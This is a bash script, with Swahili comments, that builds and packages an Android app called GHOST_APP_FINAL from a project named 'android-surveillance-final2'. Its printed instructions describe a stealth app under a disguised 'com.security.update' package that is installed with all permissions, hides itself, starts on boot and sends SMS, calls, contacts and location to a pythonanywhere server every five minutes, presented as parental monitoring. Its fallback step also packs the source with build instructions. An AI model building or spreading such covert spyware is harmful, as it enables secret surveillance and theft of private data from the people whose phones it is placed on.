#!/bin/bash
cd ~/android-surveillance-final2

echo "🎯 CREATING APK RIGHT NOW..."

# 1. Tumia system Gradle (rahisi zaidi)
echo "🔧 Using system Gradle..."
pkg install gradle -y

# 2. Set Java
export JAVA_HOME=/data/data/com.termux/files/usr/lib/jvm/java-17-openjdk
export PATH=$JAVA_HOME/bin:$PATH

# 3. Futa cache
echo "🧹 Cleaning..."
rm -rf build app/build

# 4. Build moja kwa moja
echo "🔨 Building APK..."
gradle clean
gradle assembleDebug

# 5. Check result
if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
    echo ""
    echo "🎉 🎉 🎉 APK CREATED SUCCESSFULLY! 🎉 🎉 🎉"
    echo "📱 APK: app/build/outputs/apk/debug/app-debug.apk"
    cp app/build/outputs/apk/debug/app-debug.apk ./GHOST_APP_FINAL.apk
    echo "📲 Easy access: GHOST_APP_FINAL.apk"
    echo ""
    echo "✅ SASA TUMA HII APK KWENYE SIMU!"
    echo ""
    echo "🚀 MAAGIZO KAMILI:"
    echo "   1. Copy GHOST_APP_FINAL.apk kwenye simu"
    echo "   2. Install na kutoa permissions ZOTE"
    echo "   3. Nenda: https://GhostTester.pythonanywhere.com/parent/register"
    echo "   4. Jisajili kwa namba ya simu ya mtoto"
    echo "   5. Pata Parent Code (8 herufi)"
    echo "   6. Weka code kwenye app"
    echo "   7. App itakwenda INVISIBLE"
    echo "   8. Data itatumika kila 5 mins"
    echo "   9. Angalia data: https://GhostTester.pythonanywhere.com/parent/dashboard"
else
    echo "❌ Build failed. Creating direct download solution..."
    create_download_solution
fi

create_download_solution() {
    echo "📥 DIRECT DOWNLOAD SOLUTION..."
    
    # Create a zip ya source files for manual download
    mkdir -p SOURCE_FOR_DOWNLOAD
    cp -r app/src/main/java/com/security/update/*.java SOURCE_FOR_DOWNLOAD/
    cp app/src/main/AndroidManifest.xml SOURCE_FOR_DOWNLOAD/
    
    # Create build instructions
    cat > SOURCE_FOR_DOWNLOAD/INSTRUCTIONS.txt << 'INSTRUCT'
GHOST SURVEILLANCE APP - BUILD INSTRUCTIONS

QUICK BUILD:
1. Download Android Studio
2. Create New Project → Empty Activity  
3. Replace files with these
4. Build → Generate Signed APK

FILES INCLUDED:
- LoginActivity.java (Parent code verification)
- StealthService.java (Background monitoring)
- StealthActivity.java (Hidden launcher)
- BootReceiver.java (Auto-start)
- AndroidManifest.xml (Permissions)

FEATURES:
✅ Parent code verification
✅ Hidden/stealth operation  
✅ SMS/Calls/Contacts/Location monitoring
✅ Data sent every 5 minutes
✅ Auto-start on boot

SERVER: https://GhostTester.pythonanywhere.com
INSTRUCT

    # Create zip file
    zip -r ghost_app_source.zip SOURCE_FOR_DOWNLOAD/
    
    echo "✅ SOURCE PACKAGE: ghost_app_source.zip"
    echo "📁 Download this zip and build with Android Studio"
}
